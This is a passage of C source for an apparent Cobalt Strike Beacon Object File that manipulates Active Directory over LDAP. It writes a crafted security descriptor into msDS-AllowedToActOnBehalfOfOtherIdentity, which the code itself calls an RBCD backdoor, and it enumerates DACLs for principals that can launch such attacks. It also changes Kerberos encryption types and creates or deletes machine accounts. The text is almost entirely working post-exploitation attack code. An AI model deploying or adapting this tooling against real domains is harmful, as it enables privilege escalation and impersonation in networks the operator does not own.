    PCHAR dn = FindObjectDn(filter);
    if (!dn) { bprintf("[!] Host not found..\n"); return; }

    bprintf("[?] Object : %s\n", dn);

    /* Parse the SID string ("S-1-5-21-...") into binary form. */
    unsigned char sidBytes[68];
    int sidLen = ParseSidString(sid, sidBytes, sizeof(sidBytes));
    if (sidLen <= 0) {
        bprintf("[!] Invalid SID string: %s\n", sid);
        WLDAP32$ldap_memfree(dn);
        return;
    }

    /* msDS-AllowedToActOnBehalfOfOtherIdentity must be a self-relative security
     * descriptor carrying a DACL. We build it by hand to match the exact wire
     * format impacket's rbcd.py emits (battle-tested against real DCs):
     *   revision 1, control SE_DACL_PRESENT|SE_SELF_RELATIVE (0x8004),
     *   owner = BUILTIN\Administrators, no group/SACL,
     *   DACL (ACL_REVISION_DS=4) with a single ACCESS_ALLOWED_ACE (0xF01FF).
     * Building the SDDL via ConvertStringSecurityDescriptorToSecurityDescriptorW
     * produced a value the DC rejected with 0x13 Constraint Violation. */
    static const unsigned char ownerSid[16] = {   /* S-1-5-32-544 */
        0x01, 0x02, 0x00,0x00,0x00,0x00,0x00,0x05,
        0x20,0x00,0x00,0x00, 0x20,0x02,0x00,0x00
    };

    int aceSize  = 8 + sidLen;               /* ACE header(4)+mask(4)+SID */
    int aclSize  = 8 + aceSize;              /* ACL header(8) + one ACE */
    int ownerOff = 20 + aclSize;             /* owner SID placed after DACL */
    int sdSize   = ownerOff + (int)sizeof(ownerSid);

    unsigned char sd[128];
    MSVCRT$memset(sd, 0, sizeof(sd));

    /* SECURITY_DESCRIPTOR (self-relative) */
    sd[0] = 0x01;                            /* Revision */
    sd[1] = 0x00;                            /* Sbz1 */
    sd[2] = 0x04; sd[3] = 0x80;              /* Control = 0x8004 (LE) */
    sd[4] = (unsigned char)(ownerOff & 0xFF);
    sd[5] = (unsigned char)((ownerOff >> 8) & 0xFF);
    sd[6] = (unsigned char)((ownerOff >> 16) & 0xFF);
    sd[7] = (unsigned char)((ownerOff >> 24) & 0xFF);
    /* group offset (8..11) and sacl offset (12..15) stay 0 */
    sd[16] = 0x14; sd[17] = 0; sd[18] = 0; sd[19] = 0;  /* DACL offset = 20 */

    /* ACL header: ACL_REVISION_DS */
    sd[20] = 0x04;
    sd[21] = 0x00;
    sd[22] = (unsigned char)(aclSize & 0xFF);
    sd[23] = (unsigned char)((aclSize >> 8) & 0xFF);
    sd[24] = 0x01; sd[25] = 0x00;            /* AceCount = 1 */
    sd[26] = 0x00; sd[27] = 0x00;            /* Sbz2 */

    /* ACE: ACCESS_ALLOWED, mask 0x000F01FF (full control) */
    sd[28] = 0x00;                           /* AceType */
    sd[29] = 0x00;                           /* AceFlags */
    sd[30] = (unsigned char)(aceSize & 0xFF);
    sd[31] = (unsigned char)((aceSize >> 8) & 0xFF);
    sd[32] = 0xFF; sd[33] = 0x01; sd[34] = 0x0F; sd[35] = 0x00;
    MSVCRT$memcpy(sd + 36, sidBytes, sidLen);

    /* Owner SID after the DACL */
    MSVCRT$memcpy(sd + ownerOff, ownerSid, sizeof(ownerSid));

    struct berval bv;
    struct berval* bvals[] = { &bv, NULL };
    bv.bv_len = (ULONG)sdSize;
    bv.bv_val = (PCHAR)sd;

    LDAPMod mod;
    LDAPMod* mods[2];
    /* LDAP_MOD_BVALUES is required: we fill modv_bvals (binary bervals), and
     * without the flag wldap32 reads the union as modv_strvals (char*) and
     * sends garbage — the DC then rejects it with 0x13 Constraint Violation. */
    mod.mod_op = LDAP_MOD_REPLACE | LDAP_MOD_BVALUES;
    mod.mod_type = "msDS-AllowedToActOnBehalfOfOtherIdentity";
    mod.mod_vals.modv_bvals = bvals;
    mods[0] = &mod;
    mods[1] = NULL;

    ULONG rc = ModifyWithEscalation(dn, mods);
    if (rc == LDAP_SUCCESS)
        bprintf("[+] SID added to msDS-AllowedToActOnBehalfOfOtherIdentity\n");
    else
        bprintf("[!] Failed to set msDS-AllowedToActOnBehalfOfOtherIdentity (0x%lx): %s\n", rc, WLDAP32$ldap_err2string(rc));

    WLDAP32$ldap_memfree(dn);
}

/* ---- op: read msDS-AllowedToActOnBehalfOfOtherIdentity (RBCD backdoor) ---- */
static void OpGetRBCD(const char* computer)
{
    char filter[512];
    MSVCRT$sprintf(filter, "(samaccountname=%s$)", computer);

    PCHAR dn = FindObjectDn(filter);
    if (!dn) { bprintf("[!] Host not found..\n"); return; }

    bprintf("[?] Object : %s\n", dn);

    LDAPMessage* res = NULL;
    LDAPMessage* e   = NULL;
    PCHAR  attrs[]   = { "msDS-AllowedToActOnBehalfOfOtherIdentity", NULL };
    ULONG  rc;

    rc = WLDAP32$ldap_search_s(g_ld, dn, LDAP_SCOPE_BASE, "(objectClass=*)", attrs, 0, &res);
    if (rc != LDAP_SUCCESS || !res) {
        bprintf("[!] Failed to read msDS-AllowedToActOnBehalfOfOtherIdentity (0x%lx): %s\n", rc, WLDAP32$ldap_err2string(rc));
        WLDAP32$ldap_memfree(dn);
        return;
    }

    e = WLDAP32$ldap_first_entry(g_ld, res);
    if (e) {
        struct berval** sdvals = WLDAP32$ldap_get_values_len(g_ld, e, "msDS-AllowedToActOnBehalfOfOtherIdentity");
        if (sdvals && sdvals[0] && sdvals[0]->bv_val && sdvals[0]->bv_len >= 20)
            ParseDacl((const unsigned char*)sdvals[0]->bv_val, (int)sdvals[0]->bv_len);
        else
            bprintf("[!] msDS-AllowedToActOnBehalfOfOtherIdentity is empty/unset\n");
        if (sdvals) WLDAP32$ldap_value_free_len(sdvals);
    }

    WLDAP32$ldap_msgfree(res);
    WLDAP32$ldap_memfree(dn);
}

/* ---- op: remove msDS-AllowedToActOnBehalfOfOtherIdentity ---- */
static void OpRemoveRBCD(const char* computer)
{
    char filter[512];
    MSVCRT$sprintf(filter, "(samaccountname=%s$)", computer);

    PCHAR dn = FindObjectDn(filter);
    if (!dn) { bprintf("[!] Host not found..\n"); return; }

    bprintf("[?] Object : %s\n", dn);

    LDAPMod mod;
    LDAPMod* mods[2];
    mod.mod_op = LDAP_MOD_DELETE;
    mod.mod_type = "msDS-AllowedToActOnBehalfOfOtherIdentity";
    mod.mod_vals.modv_strvals = NULL;
    mods[0] = &mod;
    mods[1] = NULL;

    ULONG rc = WLDAP32$ldap_modify_s(g_ld, dn, mods);
    if (rc == LDAP_SUCCESS)
        bprintf("[+] msDS-AllowedToActOnBehalfOfOtherIdentity property removed..\n");
    else
        bprintf("[!] Failed to remove msDS-AllowedToActOnBehalfOfOtherIdentity (0x%lx): %s\n", rc, WLDAP32$ldap_err2string(rc));

    WLDAP32$ldap_memfree(dn);
}

/* ---- safe strcat (no MSVCRT$strcat import) ---- */
static void strcat_safe(char* dst, size_t dstSz, const char* src)
{
    size_t d = 0;
    while (dst[d] && d < dstSz - 1) d++;
    size_t s = 0;
    while (src[s] && d < dstSz - 1) dst[d++] = src[s++];
    dst[d] = '\0';
}

/* ---- op: fetch objectSid (resolve a name/filter to a SID) ---- */
static void FormatSid(const unsigned char* sid, int len, char* out, int outSz)
{
    int   rev  = sid[0];
    int   nSub = sid[1];
    ULONG auth = ((ULONG)sid[4] << 24) | ((ULONG)sid[5] << 16) | ((ULONG)sid[6] << 8) | (ULONG)sid[7];
    int   pos  = 0;
    int   i;

    pos = MSVCRT$sprintf(out, "S-%d-%lu", rev, auth);

    for (i = 0; i < nSub; i++) {
        if (8 + i * 4 + 4 > len || pos >= outSz - 16) break;
        ULONG sub = (ULONG)sid[8 + i*4]
                  | ((ULONG)sid[8 + i*4 + 1] << 8)
                  | ((ULONG)sid[8 + i*4 + 2] << 16)
                  | ((ULONG)sid[8 + i*4 + 3] << 24);
        pos += MSVCRT$sprintf(out + pos, "-%lu", sub);
    }
}

static void OpGetSid(const char* filter)
{
    LDAPMessage* res = NULL;
    LDAPMessage* e   = NULL;
    PCHAR  attrs[]   = { "sAMAccountName", "objectSid", NULL };
    ULONG  rc;
    int    count = 0;

    rc = WLDAP32$ldap_search_s(g_ld, g_base, LDAP_SCOPE_SUBTREE, filter, attrs, 0, &res);
    if (rc != LDAP_SUCCESS || !res) {
        bprintf("[!] LDAP search failed (0x%lx): %s\n", rc, WLDAP32$ldap_err2string(rc));
        return;
    }

    for (e = WLDAP32$ldap_first_entry(g_ld, res); e; e = WLDAP32$ldap_next_entry(g_ld, e)) {
        PCHAR dn = WLDAP32$ldap_get_dn(g_ld, e);
        PCHAR* sams = WLDAP32$ldap_get_values(g_ld, e, "sAMAccountName");
        struct berval** sids = WLDAP32$ldap_get_values_len(g_ld, e, "objectSid");

        bprintf("\n[?] Object : %s\n", dn ? dn : "(none)");
        if (sams && sams[0])
            bprintf("    |_ sAMAccountName : %s\n", sams[0]);

        if (sids && sids[0] && sids[0]->bv_val && sids[0]->bv_len >= 8) {
            char sidstr[256];
            FormatSid((const unsigned char*)sids[0]->bv_val, (int)sids[0]->bv_len, sidstr, sizeof(sidstr));
            bprintf("    |_ objectSid      : %s\n", sidstr);
        }

        if (sams) WLDAP32$ldap_value_free(sams);
        if (sids) WLDAP32$ldap_value_free_len(sids);
        if (dn)   WLDAP32$ldap_memfree(dn);
        count++;
    }

    WLDAP32$ldap_msgfree(res);

    if (count == 0)
        bprintf("[!] Object not found..\n");
    else
        bprintf("\n[+] %d object(s) found\n", count);
}

/* ---- op: list object DACL, flagging RBCD-capable principals ---- */
static void LookupSidName(const unsigned char* sid, int sidLen, char* out, int outSz)
{
    char  name[256], domain[256];
    DWORD nameLen = sizeof(name), domainLen = sizeof(domain);
    SID_NAME_USE use;

    if (ADVAPI32$LookupAccountSidA(NULL, (PSID)(void*)sid, name, &nameLen, domain, &domainLen, &use)) {
        if (domain[0])
            MSVCRT$sprintf(out, "%s\\%s", domain, name);
        else
            MSVCRT$sprintf(out, "%s", name);
    } else {
        FormatSid(sid, sidLen, out, outSz);
    }
}

static void ParseDacl(const unsigned char* sd, int sdLen)
{
    DWORD daclOff;
    WORD  aceCount;
    const unsigned char* ace;
    int   i, listed = 0;

    if (sdLen < 20) { bprintf("[!] Security descriptor too short\n"); return; }

    daclOff = (DWORD)sd[16] | ((DWORD)sd[17] << 8) | ((DWORD)sd[18] << 16) | ((DWORD)sd[19] << 24);
    if (daclOff == 0 || daclOff + 8 > (DWORD)sdLen) {
        bprintf("[!] No DACL present\n");
        return;
    }

    ace = sd + daclOff + 8;   /* skip the 8-byte ACL header */
    aceCount = (WORD)(sd[daclOff + 4] | (sd[daclOff + 5] << 8));

    for (i = 0; i < aceCount; i++) {
        BYTE  aceType;
        WORD  aceSize;
        DWORD mask;
        const unsigned char* sidPtr  = NULL;
        const unsigned char* objGuid = NULL;
        char  objName[256];
        BOOL  hasObj = FALSE;
        BOOL  rbcd = FALSE;
        char  sidstr[256];
        char  name[512];

        if ((int)(ace - sd) + 4 > sdLen) break;
        aceType = ace[0];
        aceSize = (WORD)(ace[2] | (ace[3] << 8));
        if (aceSize < 8 || (int)(ace - sd) + aceSize > sdLen) break;

        mask = (DWORD)ace[4] | ((DWORD)ace[5] << 8) | ((DWORD)ace[6] << 16) | ((DWORD)ace[7] << 24);

        if (aceType == 0) {                 /* ACCESS_ALLOWED_ACE */
            sidPtr = ace + 8;
        } else if (aceType == 5) {          /* ACCESS_ALLOWED_OBJECT_ACE */
            /* SID offset depends on which optional GUIDs are present. The
             * Flags dword at offset 8 drives it: ObjectType (0x1) and
             * InheritedObjectType (0x2) each prepend a 16-byte GUID. */
            if (aceSize >= 12) {
                DWORD objFlags = (DWORD)ace[8] | ((DWORD)ace[9] << 8) | ((DWORD)ace[10] << 16) | ((DWORD)ace[11] << 24);
                int   sidOff   = 12;
                if (objFlags & 0x1) { objGuid = ace + 12; sidOff += 16; }  /* ObjectType GUID */
                if (objFlags & 0x2) sidOff += 16;                            /* InheritedObjectType GUID */
                sidPtr = ace + sidOff;
            }
        } else {
            ace += aceSize;
            continue;
        }

        /* Validate the SID: revision 1, <=15 sub-authorities, fully inside
         * this ACE. A bogus pointer here (e.g. a GUID read as a SID) would
         * otherwise make FormatSid walk past the buffer. */
        if (!sidPtr) { ace += aceSize; continue; }
        {
            int sidOff = (int)(sidPtr - ace);
            int subCount, sidLen;
            if (sidOff < 8 || sidOff + 8 > (int)aceSize) { ace += aceSize; continue; }
            subCount = sidPtr[1];
            if (sidPtr[0] != 1 || subCount > 15) { ace += aceSize; continue; }
            sidLen = 8 + 4 * subCount;
            if (sidOff + sidLen > (int)aceSize) { ace += aceSize; continue; }
            FormatSid(sidPtr, sidLen, sidstr, sizeof(sidstr));
            LookupSidName(sidPtr, sidLen, name, sizeof(name));
        }

        /* Resolve the ObjectType GUID (schemaIDGUID / rightsGuid) to a name. */
        if (objGuid) {
            objName[0] = '\0';
            hasObj = ResolveGuidName(objGuid, objName, sizeof(objName));
        }

        {
            const char* flags[8];
            int nf = 0;
            if (mask & 0x10000000) { flags[nf++] = "GenericAll";   rbcd = TRUE; }
            if (mask & 0x40000000) { flags[nf++] = "GenericWrite"; rbcd = TRUE; }
            if (mask & 0x40000)    { flags[nf++] = "WriteDacl";    rbcd = TRUE; }
            if (mask & 0x80000)    { flags[nf++] = "WriteOwner";   rbcd = TRUE; }
            if (mask & 0x20)       { flags[nf++] = "WriteProperty"; rbcd = TRUE; }
            if (mask & 0x100)      { flags[nf++] = "ExtendedRight"; }

            bprintf("%s %s  (mask 0x%08lx)", rbcd ? "[+]" : "[ ]", name, mask);
            if (nf > 0) {
                int k;
                bprintf(" |");
                for (k = 0; k < nf; k++) bprintf(" %s", flags[k]);
            }
            if (hasObj) bprintf(" -> %s", objName);
            bprintf("\n");
            if (rbcd) listed++;
        }

        ace += aceSize;
    }

    bprintf("\n[*] %d RBCD-capable principal(s) found\n", listed);
}

static void OpGetAcl(const char* filter)
{
    PCHAR dn = FindObjectDn(filter);
    if (!dn) { bprintf("[!] Object not found..\n"); return; }

    bprintf("[?] Object : %s\n", dn);

    unsigned char sd[8192];
    int sdLen = 0;
    if (!ReadSdAttr(dn, "ntSecurityDescriptor", sd, sizeof(sd), &sdLen) || sdLen < 20) {
        bprintf("[!] ntSecurityDescriptor empty/unreadable\n");
        WLDAP32$ldap_memfree(dn);
        return;
    }

    ParseDacl(sd, sdLen);
    WLDAP32$ldap_memfree(dn);
}

/* ---- op: read msDS-SupportedEncryptionTypes ---- */
static void PrintEncTypes(int et)
{
    if (et < 0) {
        bprintf("    |_ msDS-SupportedEncryptionTypes : (unset)\n");
        bprintf("    |_ Effective: RC4 only (AES not enabled for this account)\n");
        bprintf("    |_ Enable AES with: standin --computer <name> --enctypes 28\n");
        return;
    }
    bprintf("    |_ msDS-SupportedEncryptionTypes : %d (0x%x)\n", et, et);
    bprintf("    |_   %s RC4_HMAC_MD5             (0x04)\n", (et & 0x04) ? "[x]" : "[ ]");
    bprintf("    |_   %s AES128_CTS_HMAC_SHA1_96  (0x08)\n", (et & 0x08) ? "[x]" : "[ ]");
    bprintf("    |_   %s AES256_CTS_HMAC_SHA1_96  (0x10)\n", (et & 0x10) ? "[x]" : "[ ]");
    bprintf("    |_   %s AES256_CTS_HMAC_SHA384_192 (0x20)\n", (et & 0x20) ? "[x]" : "[ ]");
    bprintf("    |_   %s AES128_CTS_HMAC_SHA256_128 (0x40)\n", (et & 0x40) ? "[x]" : "[ ]");
}

static void OpGetEncTypes(const char* computer)
{
    char filter[512];
    MSVCRT$sprintf(filter, "(samaccountname=%s$)", computer);

    PCHAR dn = FindObjectDn(filter);
    if (!dn) { bprintf("[!] Host not found..\n"); return; }

    bprintf("[?] Object : %s\n", dn);

    LDAPMessage* res = NULL;
    LDAPMessage* e   = NULL;
    PCHAR  attrs[]   = { "msDS-SupportedEncryptionTypes", NULL };
    ULONG  rc;

    rc = WLDAP32$ldap_search_s(g_ld, dn, LDAP_SCOPE_BASE, "(objectClass=*)", attrs, 0, &res);
    if (rc != LDAP_SUCCESS || !res) {
        bprintf("[!] Failed to read msDS-SupportedEncryptionTypes (0x%lx): %s\n", rc, WLDAP32$ldap_err2string(rc));
        WLDAP32$ldap_memfree(dn);
        return;
    }

    e = WLDAP32$ldap_first_entry(g_ld, res);
    if (e) {
        PCHAR* vals = WLDAP32$ldap_get_values(g_ld, e, "msDS-SupportedEncryptionTypes");
        if (vals && vals[0])
            PrintEncTypes((int)strtol_ascii(vals[0]));
        else
            PrintEncTypes(-1);
        if (vals) WLDAP32$ldap_value_free(vals);
    }

    WLDAP32$ldap_msgfree(res);
    WLDAP32$ldap_memfree(dn);
}

/* ---- op: set msDS-SupportedEncryptionTypes ---- */
static void OpSetEncTypes(const char* computer, const char* encStr)
{
    char filter[512];
    MSVCRT$sprintf(filter, "(samaccountname=%s$)", computer);

    PCHAR dn = FindObjectDn(filter);
    if (!dn) { bprintf("[!] Host not found..\n"); return; }

    bprintf("[?] Object : %s\n", dn);

    int et = strtol_ascii(encStr);
    if (et == 0 && encStr[0] != '0') {
        bprintf("[!] Invalid encryption-types value: %s\n", encStr);
        WLDAP32$ldap_memfree(dn);
        return;
    }

    char etStr[16];
    MSVCRT$sprintf(etStr, "%d", et);
    char* vals[] = { etStr, NULL };

    LDAPMod mod;
    LDAPMod* mods[2];
    mod.mod_op = LDAP_MOD_REPLACE;
    mod.mod_type = "msDS-SupportedEncryptionTypes";
    mod.mod_vals.modv_strvals = vals;
    mods[0] = &mod;
    mods[1] = NULL;

    ULONG rc = ModifyWithEscalation(dn, mods);
    if (rc == LDAP_SUCCESS) {
        bprintf("[+] msDS-SupportedEncryptionTypes set.\n");
        PrintEncTypes(et);
    } else {
        bprintf("[!] Failed to set msDS-SupportedEncryptionTypes (0x%lx): %s\n", rc, WLDAP32$ldap_err2string(rc));
    }

    WLDAP32$ldap_memfree(dn);
}

/* ---- entry ---- */
void go(char* args, int len)
{
    datap parser;
    int   mode;
    char* computer = NULL;
    char* sid      = NULL;
    char* domain   = NULL;
    char* user     = NULL;
    char* pass     = NULL;
    char* enc      = NULL;

    g_out    = (char*)MSVCRT$calloc(OUTBUFSIZE, 1);
    g_outLen = 0;
    if (g_out) g_out[0] = '\0';

    /* .bss is NOT zeroed by the BOF loader — explicitly clear the schema/config
     * bases so ResolveGuidName's lazy-load check is deterministic. */
    g_schemaBase[0] = '\0';
    g_configBase[0] = '\0';

    BeaconDataParse(&parser, args, len);
    mode     = BeaconDataInt(&parser);
    computer = BeaconDataExtract(&parser, NULL);
    sid      = BeaconDataExtract(&parser, NULL);
    domain   = BeaconDataExtract(&parser, NULL);
    user     = BeaconDataExtract(&parser, NULL);
    pass     = BeaconDataExtract(&parser, NULL);
    enc      = BeaconDataExtract(&parser, NULL);

    if (!computer || computer[0] == '\0') {
        bprintf("[-] No target supplied\n");
        goto done;
    }

    if (mode == MODE_SID && (!sid || sid[0] == '\0')) {
        bprintf("[-] --sid requires a SID (e.g. S-1-5-21-...)\n");
        goto done;
    }

    if (mode == MODE_ENCSET && (!enc || enc[0] == '\0')) {
        bprintf("[-] --enctypes requires a value (e.g. 28 = RC4+AES128+AES256)\n");
        goto done;
    }

    if (!ResolveDomain((domain && domain[0]) ? domain : NULL)) {
        bprintf("[!] Could not resolve domain controller / realm\n");
        goto done;
    }

    if (!LdapConnect(domain, user, pass, FALSE)) {
        bprintf("[!] Failed to connect to LDAP (%s:389)\n", g_dc);
        goto done;
    }

    if (mode != MODE_MAKE) {
        if (!GetBaseDn()) {
            bprintf("[!] Failed to read defaultNamingContext\n");
            goto done;
        }
    }

    switch (mode) {
        case MODE_MAKE:    OpMake(computer);          break;
        case MODE_DISABLE: OpDisable(computer);       break;
        case MODE_DELETE:  OpDelete(computer);        break;
        case MODE_SID:     OpSetRBCD(computer, sid);  break;
        case MODE_REMOVE:  OpRemoveRBCD(computer);    break;
        case MODE_OBJECT:  OpGetSid(computer);        break;
        case MODE_ACL:     OpGetAcl(computer);        break;
        case MODE_ENCREAD: OpGetEncTypes(computer);   break;
        case MODE_ENCSET:  OpSetEncTypes(computer, enc); break;
        case MODE_RBCDREAD: OpGetRBCD(computer);       break;
        default:           bprintf("[-] Unknown mode %d\n", mode); break;
    }

    LdapDisconnect();

done:
    bflush();
    if (g_out && g_out != (char*)1)
        MSVCRT$free(g_out);
    g_out    = (char*)1;
    g_outLen = 1;
}
